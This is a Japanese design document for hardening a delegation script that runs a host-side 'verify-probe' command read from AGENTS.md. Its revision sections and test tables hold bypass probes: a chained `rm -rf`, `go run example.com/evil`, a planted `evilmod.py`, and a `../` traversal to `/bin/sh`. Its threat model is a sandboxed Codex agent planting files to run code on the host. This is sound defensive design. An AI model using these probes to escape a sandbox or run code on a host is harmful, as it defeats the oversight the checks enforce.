# 設計: verify-probe のホスト実行に形式検査と環境遮断を入れる

<!-- status: ready -->

対象は `.claude/scripts/delegate-codex.sh` の **入口検査2・3**(現行 349-368 行)。
関数の新設・変数の追加はすべてこのブロック内に閉じる。新規ファイルは作らない。

## 1. 全体方針

現行:

```bash
PROBE="$(sed -n '...' "$AGENTS" | head -1)"

if [ -z "$PROBE" ]; then
  echo "delegate-codex: 警告 — ... マーカーがありません。..." >&2
elif ! bash -c "$PROBE" >/dev/null 2>&1; then
  cat >&2 <<MSG
delegate-codex: 検証プローブが失敗しました: $PROBE
...
MSG
  exit "$EX_UNAVAIL"
fi
```

改修後の分岐は **3 分岐**:

| 状態 | 動き | 終了コード |
| --- | --- | --- |
| マーカー不在 | 警告 + スキップ(現行どおり) | 継続 |
| **形式外**(新規) | **警告 + スキップ**(実行しない) | 継続 |
| 形式適合 | プローブ内容を stderr に出してから `env -i` 付きで実行 | 失敗時 `exit $EX_UNAVAIL` |

**形式外をフェイルオープンにする理由**: 守りたいのは「ホスト上で任意コマンドが走らないこと」。
導通確認が取れないことは委託を止める理由にならない。ここを `exit` にすると、
`AGENTS.md` は `merge` 区分でプロジェクトが自由に書き換えるため、正当だが形式に載らない
プローブを書いたプロジェクトの委託が全部止まる。

## 2. 許可リストの定義

`PROBE=` の代入の**直前**に、定数と関数をこの順で置く。

```bash
# ---- 入口検査3 の許可リスト(プローブ形式) ----
#
# AGENTS.md は merge 区分でプロジェクトが書き換える面であり、かつ出口ハッシュ検査が
# 効かない経路(モード C / シグナルで出口検査に到達せず死んだ委託 / 人間の誤マージ)が
# 残る。ここで抽出した文字列は **ホスト上の bash -c にそのまま渡る**ため、
# 形式検査を掛けてからでないと実行しない。
#
# denylist(禁止文字を弾く)にはしない。クォート・展開・多バイト表現で必ず抜ける。
# 「許可した文字だけで構成され、許可したコマンドで始まり、導通確認トークンを含む」
# という許可リスト方式にする。

# 第 1 トークンとして許可する実行コマンド。導通確認に使う言語ランタイム /
# パッケージマネージャに限る。ここに無いものは実行しない。
# (npx を許可する以上 curl 相当の到達はできないが、rm --version のような
#  「バージョン表示は無害でも本体が危険」なコマンドを弾くために必要)
PROBE_ALLOWED_CMDS="npx npm node deno bun pnpm yarn python python3 pip pip3 uv poetry ruby bundle rake go cargo rustc java mvn gradle dotnet php composer swift"

# いずれか 1 つの出現を必須とする導通確認トークン。
# 「バージョン/ヘルプを表示して終わる」以上のことをさせない意思表示。
PROBE_VERIFY_TOKENS="--version -version -V -v version --help -h"
```

## 3. 形式検査関数

> **【改訂あり】この節の (c) / (d) / (e) は §12 で置き換えられた。**
> トークン単位の許可では `npm install left-pad --version` が通過する(実測)。
> 実装は §12 に従うこと。(a) / (b) と関数の外形はそのまま使う。

```bash
# プローブ文字列が許可形式かを判定する。0 = 許可 / 1 = 不許可。
# 不許可の理由は標準出力に 1 行返す(呼び出し側が警告に埋め込む)。
probe_format_reason() {
  local probe="$1"
  local first token found

  # (a) 長さ上限。導通確認にこれ以上は要らない。
  if [ "${#probe}" -gt 200 ]; then
    echo "200 文字を超えています"
    return 1
  fi

  # (b) 文字とトークン区切りの制限。
  #     許可文字: 英数 . _ / @ = : + -
  #     区切りは半角スペース 1 個のみ(連続スペース・タブ・改行は不許可)。
  #     これによりシェルのメタ文字( ; | & $ ` ' " ( ) < > * ? \ ! ~ 改行 )が
  #     すべて構文上あらわれない = bash -c に渡してもコマンド連結・展開が起きない。
  if ! LC_ALL=C printf '%s' "$probe" |
    grep -qE '^[A-Za-z0-9][A-Za-z0-9._/@=:+-]*( [A-Za-z0-9._/@=:+-]+)*$'; then
    echo "許可されない文字またはトークン区切りが含まれています(許可: 英数 . _ / @ = : + - と半角スペース 1 個区切り)"
    return 1
  fi

  # (c) 第 1 トークンが許可コマンドであること。
  first="${probe%% *}"
  found=0
  for token in $PROBE_ALLOWED_CMDS; do
    [ "$first" = "$token" ] && { found=1; break; }
  done
  if [ "$found" = 0 ]; then
    echo "許可されていないコマンドです: $first"
    return 1
  fi

  # (d) 導通確認トークンを 1 つ以上含むこと。
  found=0
  for token in $probe; do
    case " $PROBE_VERIFY_TOKENS " in
      *" $token "*) found=1; break ;;
    esac
  done
  if [ "$found" = 0 ]; then
    echo "導通確認トークン(${PROBE_VERIFY_TOKENS// /, })のいずれかを含めてください"
    return 1
  fi

  # (e) npx は --no-install 必須。
  #     プローブは **ホスト側**(ネットワークあり)で走るため、--no-install が無いと
  #     npx がレジストリから任意パッケージを取得して実行する。sandbox の
  #     ネットワーク無効性は、この経路を守らない。
  if [ "$first" = "npx" ]; then
    case " $probe " in
      *" --no-install "*) ;;
      *)
        echo "npx には --no-install が必須です"
        return 1
        ;;
    esac
  fi

  return 0
}
```

**実装上の注意**

- `for token in $probe` は**意図的にクォートしない**(単語分割でトークン化する)。
  (b) を通過済みなのでグロブ文字は含まれず、`set -f` は不要。
- `${PROBE_VERIFY_TOKENS// /, }` は bash の文字列置換。`sh` 互換は不要
  (このスクリプトは `#!/bin/bash`)。
- `local` を使う。スクリプトは `set -uo pipefail`(`-e` なし)なので、
  `return 1` は呼び出し側の `if` で受ける。

## 4. 実行環境の遮断

`probe_format_reason` の直後に置く。

```bash
# プローブに渡す環境(許可リスト方式)。#23 で codex exec に入れたものと同じ考え方だが、
# **意図的に狭い**。プローブは「バージョンを表示して終わる」固定形のコマンドであり、
# エージェント実行のようにロケール・プロキシ・CA を必要としない。
#   PATH    env 自身が bash を解決するのに要る。未設定時は最小の既定値を置く
#           (未設定のまま env -i すると bash すら見つからない)
#   HOME    npm / cargo / go のキャッシュ・設定探索元。無くても現行プローブは通るが、
#           他スタックのプローブが HOME 前提で落ちるのを避けるため残す
#   TMPDIR  一時ディレクトリを既定から外している環境向け
PROBE_ENV=("PATH=${PATH:-/usr/local/bin:/usr/bin:/bin}")
for _pe in HOME TMPDIR; do
  [ -n "${!_pe+x}" ] && PROBE_ENV+=("$_pe=${!_pe}")
done
unset _pe
```

実行は:

```bash
env -i "${PROBE_ENV[@]}" bash -c "$PROBE"
```

`PROBE_ENV` は必ず 1 要素以上(PATH)なので `set -u` でも安全。

## 5. 分岐の書き換え

`PROBE=` 代入以降を次に**置き換える**:

```bash
PROBE="$(sed -n 's/^[[:space:]]*<!--[[:space:]]*verify-probe:[[:space:]]*\(.*[^[:space:]]\)[[:space:]]*-->[[:space:]]*$/\1/p' "$AGENTS" | head -1)"

if [ -z "$PROBE" ]; then
  # AGENTS.md は merge 区分でプロジェクトが書き換える。マーカー未反映の
  # プロジェクトを止めないため、ここだけはフェイルオープン。
  echo "delegate-codex: 警告 — AGENTS.md に <!-- verify-probe: ... --> がありません。依存の導通確認をスキップします。" >&2
elif ! _probe_reason="$(probe_format_reason "$PROBE")"; then
  # 形式外は **実行せず** スキップする。AGENTS.md の改ざんが
  # ホスト上のコマンド実行に化ける経路をここで断つ。
  cat >&2 <<MSG
delegate-codex: 警告 — 検証プローブが許可形式に適合しないため実行しません: $PROBE
  理由: $_probe_reason

AGENTS.md の <!-- verify-probe: ... --> を許可形式に直してください(制約は AGENTS.md §2 に記載)。
意図しない書き換えの可能性がある場合は、委託を続ける前に git diff で AGENTS.md を確認してください。
依存の導通確認はスキップします(委託自体は続行します)。
MSG
else
  # 何が実行されるかを毎回目に見える形にする。ここを黙らせない。
  echo "delegate-codex: 検証プローブを実行します: $PROBE" >&2
  if ! env -i "${PROBE_ENV[@]}" bash -c "$PROBE" >/dev/null 2>&1; then
    cat >&2 <<MSG
delegate-codex: 検証プローブが失敗しました: $PROBE

依存が未インストールの可能性があります。Codex の sandbox はネットワーク
無効のため、この状態で委託すると何も完遂できないまま枠だけを消費します。
先に依存をインストールしてから再実行してください。

(プローブは env -i + 最小の環境変数で実行されます。親の環境変数に依存する
 プローブはここで失敗します。)
MSG
    exit "$EX_UNAVAIL"
  fi
fi
unset _probe_reason
```

**`elif ! _probe_reason="$(...)"` の形にする理由**: 判定と理由文字列を 1 回の呼び出しで
受け取るため。コマンド置換の終了ステータスが `if` の判定に使われる。

## 6. 併せて直すコメント

`delegate-codex.sh` 174 行付近と 678 行付近に、この経路の説明コメントが既にある。
**174 行付近**(出口検査の空振り条件の説明)に 1 行足す:

```
#     形式検査(入口検査3)で「ホスト上で任意コマンドが走る」ことは防いでいるが、
#     AGENTS.md の規約本文の改ざんは依然この経路で検出できない。
```

678 行付近は委託先向けプロンプトの生成箇所で、検査そのものの説明ではないため触らない。

## 7. AGENTS.md(§2 検証コマンド)

`<!-- verify-probe: npx --no-install eslint --version -->` の下の引用ブロックに、
形式制約を追記する。既存の文面は残し、続けて次を足す:

```
> **形式制約(`delegate-codex.sh` の入口検査3 が機械検査します)。** この行はホスト上で実行されるため、次の形に限って実行されます。外れた場合は**実行されず警告が出ます**(委託は続行します)。
>
> - 使える文字は英数と `.` `_` `/` `@` `=` `:` `+` `-`、区切りは半角スペース 1 個のみ(`;` `|` `&` `$` `` ` `` 引用符・リダイレクトはすべて不可)
> - 先頭は言語ランタイム / パッケージマネージャのコマンド(`npx` `npm` `node` `python` `go` `cargo` `mvn` 等)
> - `--version` / `-v` / `version` / `--help` のいずれかを含むこと
> - `npx` の場合は `--no-install` が必須(**ホスト側にはネットワークがあるため**、外すとレジストリから取得して実行してしまう)
> - 全体 200 文字以内
```

§7(委託先向けの禁止事項、140 行付近)の `AGENTS.md` の項も 1 文足す:
「形式検査が入っていますが、**検査を通る範囲でも書き換えないでください**」。

## 8. CLAUDE.md

委託禁止領域の `AGENTS.md` の項(35 行)の末尾に追記する:

```
(入口検査3 に許可リスト形式の機械検査と `env -i` 実行を入れてあるが、**多層防御であって置き換えではない**。禁止領域からは外さない)
```

## 9. CHANGELOG

`docs/template-dev/CHANGELOG.md` の `## 2026-08-29` 見出しの**末尾**(既存 3 段落の後)に
追記する。**新しい日付見出しは作らない**(同日中の追記は既存見出しに足す)。区分は
`[auto]`(スクリプトと `AGENTS.md` は同期対象で、取り込む側の作業は原則不要)。
ただし **`AGENTS.md` は `merge` 区分**なので、独自プローブを書いているプロジェクトは
形式適合の確認が要る。その 1 点だけ `[manual]` にする。

## 10. 検証手順(実装者が実行する)

`AGENTS.md` を一時的に書き換えて入口検査3 の分岐を通す。`impl` の target を
`.steering/` 外にすると **入口検査5-1 で `exit 2`** になり、codex を起動せずに
入口検査3 の出力だけを観測できる。

```bash
cp AGENTS.md /tmp/AGENTS.md.bak
```

| # | プローブ | 期待 |
| --- | --- | --- |
| V1 | `npx --no-install eslint --version`(現行のまま) | `検証プローブを実行します:` が出て、形式外警告は出ない。5-1 の `exit 2` まで到達 |
| V2 | `curl https://example.com` | `許可形式に適合しないため実行しません` + 理由「許可されない文字…」。`curl` が実行されない |
| V3 | `npx --no-install eslint --version ; rm -rf /tmp/probe-canary` | 形式外で実行されない。**事前に `touch /tmp/probe-canary` しておき、実行後も残っていることを確認する** |
| V4 | `rm -rf --version` | 理由「許可されていないコマンドです: rm」 |
| V5 | `npx eslint --version`(`--no-install` 欠落) | 理由「npx には --no-install が必須です」 |
| V6 | `npm run lint` | 理由「導通確認トークン…」 |
| V7 | `node --version` | 通る(実行される) |

実行例:

```bash
sed -i 's|<!-- verify-probe: .* -->|<!-- verify-probe: curl https://example.com -->|' AGENTS.md
bash .claude/scripts/delegate-codex.sh impl /tmp/not-steering; echo "exit=$?"
```

最後に必ず復元する:

```bash
cp /tmp/AGENTS.md.bak AGENTS.md && git diff --stat AGENTS.md
```

**注意**: 検証中の一時書き換えを**コミットしない**。`git status` で AGENTS.md が
意図した変更(§7 の追記)だけになっていることを確認してから commit する。

`env -i` の実測(受け入れ条件)は既に確認済み:
`env -i PATH="$PATH" bash -c 'npx --no-install eslint --version'` → `v10.8.1` / rc=0。
実装後に V1 で同じ結果になることを再確認する。

## 11. やらないこと

- `probe_format_reason` の別ファイル切り出し(`delegate-codex.sh` は委託の唯一の入口で、
  検査の実体を外に出すと保護対象が増える)
- 許可リストの外部設定化(Issue のスコープ外)
- `.codex/skills/degraded-mode-ticket/SKILL.md` の probe 抽出行の変更
  (モード C は `delegate-codex.sh` を通らない別経路。#42 の `check-guard-integrity.sh degraded`
  が担当する領域であり、このチケットでは触らない)

---

## 12. 改訂(検収 round 1 の Critical 対応)

### 12.1 何が漏れていたか

§3 の判定は **トークン単位の許可**だった:

- (c) 第 1 トークンが許可コマンド
- (d) どこかに導通確認トークンが 1 つ含まれる

この 2 条件は「第 2 トークン以降のサブコマンド」を一切見ていない。実測(改修版スクリプトに
実プローブとして流して確認)で、次がすべて **`検証プローブを実行します:` に到達した**:

| プローブ | ホスト上で起きること |
| --- | --- |
| `npm install left-pad --version` | 依存取得 + postinstall スクリプト実行 |
| `pip install requests --version` | 取得 + `setup.py` / build hook 実行 |
| `go run example.com/evil --version` | リモートモジュール取得 + 実行 |
| `cargo install ripgrep --version 1.0.0` | `--version` が「取得するバージョン指定」に化ける |
| `yarn add left-pad --version` / `uv add ...` / `composer require ...` | 同上 |

`env -i` はネットワークを塞がない。**要求 R1「ホスト上で任意コマンドが走らないこと」を
満たせていない。** `npx` にだけ `--no-install` を強制した (e) が、他のコマンドに一般化
されていなかったのが原因。

**denylist(危険なサブコマンド名を弾く)にはしない。** `install` / `add` / `get` / `run` /
`exec` / `require` / `tool` を列挙しても、パッケージマネージャごとの別名(`i` / `isntall` /
`--yes` 付き別経路)で必ず抜ける。§2 の設計哲学どおり**許可リストで倒す**。

### 12.2 置き換える判定: 全体の固定形マッチ

(c) / (d) / (e) を捨て、**プローブ全体が次の 3 形のいずれかに完全一致すること**を条件にする。

| 形 | 構造 | 例 |
| --- | --- | --- |
| P1 | `<cmd> <verify>`(2 トークン) | `node --version` / `go version` / `cargo --version` |
| P2 | `npx --no-install <pkg> <verify>`(4 トークン) | `npx --no-install eslint --version` |
| P3 | `python`\|`python3` `-I -m <module> <verify>`(5 トークン。**§13 で `-I` 必須に改訂**) | `python3 -I -m pytest --version` |

- `<verify>` は `PROBE_VERIFY_TOKENS` のいずれかで、**必ず末尾**に来ること
- `<cmd>` は `PROBE_ALLOWED_CMDS` のいずれか(P1 のみ。P2/P3 は形が固定なので個別に判定)
- P1 が 2 トークン固定なので、`npm install ...` は**トークン数で落ちる**
- P2/P3 以外の 4 トークンも落ちる(`go run example.com/evil --version` は P2 でも P3 でもない)
- `PROBE_ALLOWED_CMDS` / `PROBE_VERIFY_TOKENS` の**定義そのものは §2 のまま変更しない**

**P3 を入れる理由**: `python3 -m pytest --version` は多くの Python プロジェクトで唯一の
導通確認になる。`python -m pip install X` は 6 トークンで落ちる。

> **【訂正】** 初版はここに「`-m` はローカルにインストール済みのモジュールしか読まない
> ため P1 と同じ危険度で収まる」と書いていたが、**誤り**。`python -m` は cwd を
> `sys.path` の先頭に入れるため、リポジトリ直下に `<module>.py` を置ければそれが走る
> (実測)。P1 の `<cmd>` が固定の許可リスト = 攻撃者が作れないシステム上の実行ファイル
> に限られるのとは危険度が違う。§13 で `-I` を必須にして塞ぐ。

**P1/P2/P3 に載らない正当なプローブ**(`bundle exec rspec --version` 等)は**フェイルオープン
で警告 + スキップ**になる。委託は止まらないので実害はなく、Issue のスコープ外(許可リストの
設定可能化)に倒す。

### 12.3 実装

`probe_format_reason()` の **(a) と (b) はそのまま残し、(c)(d)(e) を次で置き換える**。
関数の外形(引数・戻り値・理由を標準出力に 1 行返す規約)も変えない。

(a) の直後、(b) の直前に **改行の明示的な排除**を足す:

```bash
  # (a2) 改行を含むものは弾く。以降の grep は行単位で判定するため、複数行のうち
  #      1 行だけが許可形式なら通過してしまう。現状の抽出は head -1 で単一行だが、
  #      「呼び出し側が単一行を渡す」という暗黙の前提に防御を預けない。
  case "$probe" in
    *$'\n'*)
      echo "改行を含んでいます"
      return 1
      ;;
  esac
```

(b) の直後を次に置き換える(`local first token found` の宣言は不要になるので
`local probe="$1"` の行に合わせて `local -a parts` / `local n last` に差し替える):

```bash
  # (c) 全体が導通確認の固定形に一致すること。
  #     トークン単位の許可(第 1 トークン + どこかに --version)では不十分だった:
  #     npm install left-pad --version / pip install requests --version /
  #     go run example.com/evil --version がすべて通り、postinstall・setup.py・
  #     リモートモジュール取得を経由してホスト上で任意コードが走る(実測)。
  #     env -i はネットワークを塞がないので、これは実害のある経路。
  #
  #       P1  <cmd> <verify>                       node --version / go version
  #       P2  npx --no-install <pkg> <verify>      npx --no-install eslint --version
  #       P3  python|python3 -m <module> <verify>  python3 -m pytest --version
  #
  #     (b) が空白 1 個区切りを保証しているので、単語分割でトークン化してよい。
  IFS=' ' read -r -a parts <<<"$probe"
  n="${#parts[@]}"
  last="${parts[$((n - 1))]}"

  # 末尾は必ず導通確認トークン。「表示して終わる」以外を書けなくする。
  case " $PROBE_VERIFY_TOKENS " in
    *" $last "*) ;;
    *)
      echo "末尾は導通確認トークン(${PROBE_VERIFY_TOKENS// /, })である必要があります"
      return 1
      ;;
  esac

  if [ "$n" = 2 ]; then
    # P1
    case " $PROBE_ALLOWED_CMDS " in
      *" ${parts[0]} "*) return 0 ;;
      *)
        echo "許可されていないコマンドです: ${parts[0]}"
        return 1
        ;;
    esac
  fi

  if [ "$n" = 4 ]; then
    # P2: npx は --no-install 必須(ホスト側にはネットワークがあるため、
    #     外すとレジストリから取得して実行してしまう)
    if [ "${parts[0]}" = "npx" ] && [ "${parts[1]}" = "--no-install" ]; then
      if LC_ALL=C printf '%s' "${parts[2]}" | grep -qE '^[A-Za-z0-9@][A-Za-z0-9._/@-]*$'; then
        return 0
      fi
      echo "npx のパッケージ名が不正です: ${parts[2]}"
      return 1
    fi
    # P3
    if { [ "${parts[0]}" = "python" ] || [ "${parts[0]}" = "python3" ]; } && [ "${parts[1]}" = "-m" ]; then
      if LC_ALL=C printf '%s' "${parts[2]}" | grep -qE '^[A-Za-z0-9_][A-Za-z0-9._]*$'; then
        return 0
      fi
      echo "python -m のモジュール名が不正です: ${parts[2]}"
      return 1
    fi
  fi

  echo "許可された形に一致しません(<cmd> <verify> / npx --no-install <pkg> <verify> / python -m <module> <verify> のいずれか)"
  return 1
```

**注意点**

- `${parts[0]}` は `n >= 1` が (b) の正規表現(先頭 1 文字以上)で保証される
- `IFS=' ' read -r -a parts <<<"$probe"` の `IFS=` 前置は read の間だけ有効。
  スクリプト全体の `IFS` は変えない
- `set -u` 下でも `parts` は必ず 1 要素以上になるので添字参照は安全
- §2 の定数(`PROBE_ALLOWED_CMDS` / `PROBE_VERIFY_TOKENS`)は**変更しない**

### 12.4 AGENTS.md §2 の記述を実態に合わせる

§7 で追記した箇条書きは「トークン単位」の説明になっており、`npm install ... --version` が
通らないことが読み取れない。**箇条書き全体を次に差し替える**(見出し行「**形式制約(…)**」は残す):

```
> - 実行されるのは次の 3 つの形だけです:
>   - `<コマンド> <確認フラグ>` — 例: `node --version` / `go version` / `cargo --version`
>   - `npx --no-install <パッケージ> <確認フラグ>` — 例: `npx --no-install eslint --version`
>   - `python3 -m <モジュール> <確認フラグ>` — 例: `python3 -m pytest --version`
> - `<確認フラグ>` は `--version` / `-version` / `-V` / `-v` / `version` / `--help` / `-h` のいずれかで、**必ず末尾**に置くこと
> - `<コマンド>` は許可された言語ランタイム / パッケージマネージャのみ(`npx` `npm` `node` `python` `go` `cargo` `mvn` 等)
> - **`install` / `add` / `run` / `exec` のようなサブコマンドは書けません。** 依存の取得やライフサイクルスクリプトがホスト上で走るためです(`npx` の `--no-install` が必須なのも同じ理由)
> - 使える文字は英数と `.` `_` `/` `@` `=` `:` `+` `-`、区切りは半角スペース 1 個のみ(`;` `|` `&` `$` `` ` `` 引用符・リダイレクト・改行はすべて不可)
> - 全体 200 文字以内
```

### 12.5 CHANGELOG の記述を実態に合わせる

§9 で追記した `[auto]` 項の、形式検査の説明部分を差し替える。
「許可文字のみ・許可コマンドで始まる・導通確認トークンを含む・200 文字以内・`npx` は
`--no-install` 必須」→
「**プローブ全体が 3 つの固定形(`<cmd> <verify>` / `npx --no-install <pkg> <verify>` /
`python -m <module> <verify>`)のいずれかに完全一致すること**を要求します。
`npm install ... --version` のようなサブコマンド付きは通りません(ホスト側にはネットワークが
あり、依存取得と postinstall がそのまま走るため)」。

`[manual]` 項はそのままでよい(独自プローブの適合確認という指示は変わらない)。

### 12.6 追加の検証(§10 の V1-V7 に足す)

**V1-V7 は改訂後も同じ期待値**(V6 `npm run lint` の理由文言だけ変わる)。加えて:

| # | プローブ | 期待 |
| --- | --- | --- |
| V8 | `npm install left-pad --version` | 実行されない(「許可された形に一致しません」)。**`git status` で `node_modules` / `package.json` に差分が出ていないことも確認する** |
| V9 | `pip install requests --version` | 実行されない |
| V10 | `go run example.com/evil --version` | 実行されない |
| V11 | `python3 -m pytest --version` | **通る**(P3。実行されて失敗する場合は `exit 3` になるが、`検証プローブを実行します:` が出れば形式検査は合格) |
| V12 | `cargo --version` | **通る**(P1) |
| V13 | `npx --no-install eslint` | 実行されない(末尾が確認フラグでない) |

V8-V10 は「実行されないこと」が要点なので、**期待どおり弾かれた後に `git status --short` が
きれいなままであること**を必ず確認する。

---

## 13. 改訂(検収 round 2 の Critical 対応)

### 13.1 指摘と実測

プローブは `cd "$ROOT"`(リポジトリルート)した状態で実行される(`delegate-codex.sh:96`)。
形式が固定でも、**ワークツリーに置かれたファイル**を経由して任意コードに化ける:

| 経路 | 実測 |
| --- | --- |
| P3 `python3 -m evilmod --version` + リポジトリ直下の `evilmod.py` | `EVIL PY EXECUTED` が出る(**再現**) |
| P2 `npx --no-install foo --version` + `node_modules/.bin/foo` | `node_modules/.bin` から解決されて実行される |

脅威モデルと噛み合う: サンドボックス内の Codex は `workspace-write` なので、
`AGENTS.md` の 1 行と `evilmod.py` を**同じ委託で両方置ける**。

### 13.2 採否の判断

| 指摘の修正案 | 採否 | 理由 |
| --- | --- | --- |
| **P3 に `-I` を必須にする** | **採用** | 実測で `python3 -I -m evilmod --version` → `No module named evilmod`。cwd 挿入を止めつつ、インストール済みモジュールの導通確認という P3 の用途は保てる |
| **空の隔離 tmpdir で実行する** | **不採用** | 実測で空ディレクトリでの `npx --no-install eslint --version` は `npx canceled due to missing packages` で失敗する。プローブの目的は「**このプロジェクトの**ローカル依存が入っているか」であり、隔離すると常に失敗して恒常的に `exit 3` になる。要求 R2(現行プローブがそのまま通る)と真っ向から衝突し、Issue のスコープ外(「プローブの廃止」)に等しい |
| **P2 のパッケージ名をさらに絞る** | **不採用** | `node_modules/.bin/<name>` の名前衝突は文字種制限では防げない(指摘自身が認めている) |

### 13.3 残存リスクの明示(塞がずに書く)

**P2 の `node_modules/.bin` 解決は、形式検査では原理的に閉じられない。**
プローブの正当な仕事が「プロジェクトのローカル実行ファイルを起動して版を出す」ことだから、
`npx --no-install eslint --version` という**改ざんされていないプローブ**であっても、
`node_modules/.bin/eslint` を差し替えられていればホスト上でそれが走る。
つまりこれは **`AGENTS.md` の文字列の問題ではなく、ワークツリーの完全性の問題**であり、
入口検査3 の担当範囲ではない(出口ハッシュ検査 / #46 の「running 残置 record の禁止領域
diff 検査」/ 復帰時の `check-guard-integrity.sh degraded` が受け持つ層)。

**このチケットで閉じるのは「文字列そのものが任意コマンドに化ける経路」までとし、
残るリスクはコメントとドキュメントに明記する。** 黙って閉じたことにしない。

### 13.4 実装

**(1) P3 の形を 5 トークンに変える**(`probe_format_reason()` の `if [ "$n" = 4 ]` ブロック内の
P3 判定を削除し、`if [ "$n" = 5 ]` のブロックを新設する)。

```bash
  if [ "$n" = 5 ]; then
    # P3: python -I -m <module> <verify>
    #     -I は必須。付けないと python は cwd を sys.path の先頭に入れるため、
    #     リポジトリ直下に <module>.py を置くだけでホスト上の任意コード実行になる
    #     (実測: python3 -m evilmod --version でカレントの evilmod.py が走る。
    #      -I を付けると No module named evilmod で止まる)。
    if { [ "${parts[0]}" = "python" ] || [ "${parts[0]}" = "python3" ]; } &&
      [ "${parts[1]}" = "-I" ] && [ "${parts[2]}" = "-m" ]; then
      if LC_ALL=C printf '%s' "${parts[3]}" | grep -qE '^[A-Za-z0-9_][A-Za-z0-9._]*$'; then
        return 0
      fi
      echo "python -I -m のモジュール名が不正です: ${parts[3]}"
      return 1
    fi
  fi
```

`n = 4` のブロックは **P2 だけ**になる(P3 の分岐を丸ごと移す)。
最後の汎用エラーメッセージも `python -I -m <module> <verify>` に直す:

```bash
  echo "許可された形に一致しません(<cmd> <verify> / npx --no-install <pkg> <verify> / python -I -m <module> <verify> のいずれか)"
```

**(2) (c) のコメントブロックの P3 の行を直す**:

```
  #       P3  python|python3 -I -m <module> <verify>  python3 -I -m pytest --version
```

**(3) 残存リスクを `probe_format_reason()` の直前のコメント(§2 の許可リスト説明)の末尾に足す**:

```bash
# **形式検査で閉じられない残りのリスク**: プローブは cd "$ROOT" した状態で実行される。
# npx --no-install <pkg> は node_modules/.bin/<pkg> を解決するため、ワークツリーに
# 実行ファイルを置ける相手には、AGENTS.md を 1 文字も変えなくてもホスト実行の経路が
# 残る。これはプローブの正当な仕事(このプロジェクトのローカル依存の導通確認)と
# 表裏一体で、形式検査では原理的に閉じられない。空ディレクトリでの実行は
# npx --no-install が常に失敗するため採れない(実測)。ワークツリーの完全性は
# 出口ハッシュ検査・check-guard-integrity.sh degraded が受け持つ別の層。
```

### 13.5 AGENTS.md §2 の差し替え

§12.4 で入れた箇条書きのうち、**P3 の行と例を `-I` 付きに変え、残存リスクの注記を足す**:

- `python3 -m <モジュール> <確認フラグ>` の行 → ``python3 -I -m <モジュール> <確認フラグ>`` — 例: `python3 -I -m pytest --version`(**`-I` は必須**。付けないとカレントディレクトリのファイルが読まれます)
- 箇条書きの最後に 1 項目足す:

```
> - **形式が合っていても安全になるわけではありません。** `npx --no-install <パッケージ>` はワークツリーの `node_modules/.bin/` を解決します。プローブの形式検査は「文字列が任意コマンドに化けること」を防ぐもので、ワークツリーに置かれた実行ファイルまでは守りません(だからこのファイルも `node_modules/` も書き換えないでください)
```

### 13.6 CHANGELOG の追記

§12.5 で差し替えた `[auto]` 項の末尾に 1 文足す:

```
なお `python -m` 形は `-I` を必須にしています(付けないとカレントディレクトリのファイルがモジュールとして読まれるため)。形式検査が守るのは「文字列が任意コマンドに化けること」までで、ワークツリーに置かれた実行ファイル(`node_modules/.bin/` 等)は出口ハッシュ検査と `check-guard-integrity.sh degraded` の担当です。
```

### 13.7 検証(§12.6 に足す)

| # | プローブ | 期待 |
| --- | --- | --- |
| V14 | `python3 -I -m pytest --version` | 形式検査を通る(`検証プローブを実行します:` が出る) |
| V15 | `python3 -m pytest --version`(`-I` なし) | **実行されない**(「許可された形に一致しません」) |
| V16 | `python3 -I -m evilmod --version` + リポジトリ直下に `evilmod.py` を置く | 形式検査は通るが、**`EVIL PY EXECUTED` が出ないこと**を確認する(`-I` が効いている)。確認後 `evilmod.py` を必ず削除する |

V11(`python3 -m pytest --version`)は **V15 に置き換わる**(期待値が「通る」→「実行されない」に変わる)。

---

## 14. 改訂(検収 round 3 の Critical 対応)

### 14.1 指摘と実測

P2 のパッケージ名検査 `^[A-Za-z0-9@][A-Za-z0-9._/@-]*$` は `.` と `/` を無制限に許すため、
**`..` によるパストラバーサルが通る**。実測(このリポジトリで、ファイルを 1 つも置かずに):

```
<!-- verify-probe: npx --no-install docs/../../../../../../../bin/sh --version -->
  → delegate-codex: 検証プローブを実行します: ...(形式検査を通過)
  → docs/../../../../../../../bin/sh: 0: Illegal option --   (/bin/sh が起動している)
```

**§13.3 で受容した残存リスクより広い。** あちらは「ワークツリー内に置かれた実行ファイル」
に限られ、ワークツリー完全性の層(出口ハッシュ検査 / `check-guard-integrity.sh degraded`)が
受け持てる前提だった。この経路は**ワークツリーの外の絶対パス**へ脱出するので、その層では
原理的に検出できない。受容の前提が崩れているため、**受容せず塞ぐ**。

### 14.2 実装

**(1) P2 のパッケージ名を npm のパッケージ名文法に絞る**(`/` は `@scope/name` の 1 回だけ):

```bash
    if [ "${parts[0]}" = "npx" ] && [ "${parts[1]}" = "--no-install" ]; then
      # パッケージ名は npm の文法(@scope/name または name)に限る。
      # 旧: ^[A-Za-z0-9@][A-Za-z0-9._/@-]*$ は . と / を無制限に許したため
      # `docs/../../../../../../../bin/sh` が通り、ワークツリーの外の絶対パス実行ファイルを
      # 起動できた(実測で /bin/sh に到達)。/ を @scope/ の 1 回だけに縛る。
      if _probe_name_ok "${parts[2]}" '^(@[A-Za-z0-9][A-Za-z0-9._-]*/)?[A-Za-z0-9][A-Za-z0-9._-]*$'; then
        return 0
      fi
      echo "npx のパッケージ名が不正です: ${parts[2]}"
      return 1
    fi
```

**(2) P3 のモジュール名も同じヘルパーを通す**(こちらは `/` を許していないので現状も
トラバーサルは通らないが、`..` の明示排除を共通化する):

```bash
      if _probe_name_ok "${parts[3]}" '^[A-Za-z0-9_][A-Za-z0-9._]*$'; then
        return 0
      fi
```

**(3) 共通ヘルパーを `probe_format_reason()` の直前に足す**:

```bash
# パッケージ名 / モジュール名の検査。正規表現に一致し、かつ `..` を含まないこと。
# 正規表現だけに頼らず `..` を独立に弾くのは多重防御 — 文字クラスの見落としが
# そのままパストラバーサルになった経緯(design §14)があるため。
_probe_name_ok() {
  case "$1" in
    *..*) return 1 ;;
  esac
  LC_ALL=C printf '%s' "$1" | grep -qE "$2"
}
```

### 14.3 CHANGELOG の Minor 修正

`[auto]` 項の太字部分の 3 形の列挙が `python -m <module> <verify>`(`-I` なし)のままで、
同じ段落の末尾の「`-I` を必須にしています」と矛盾している。
列挙側を **`python -I -m <module> <verify>`** に直す(末尾の 1 文はそのまま)。

### 14.4 検証(追加)

| # | プローブ | 期待 |
| --- | --- | --- |
| V17 | `npx --no-install docs/../../../../../../../bin/sh --version` | **実行されない**(「npx のパッケージ名が不正です」)。`Illegal option` が出ないことを確認する |
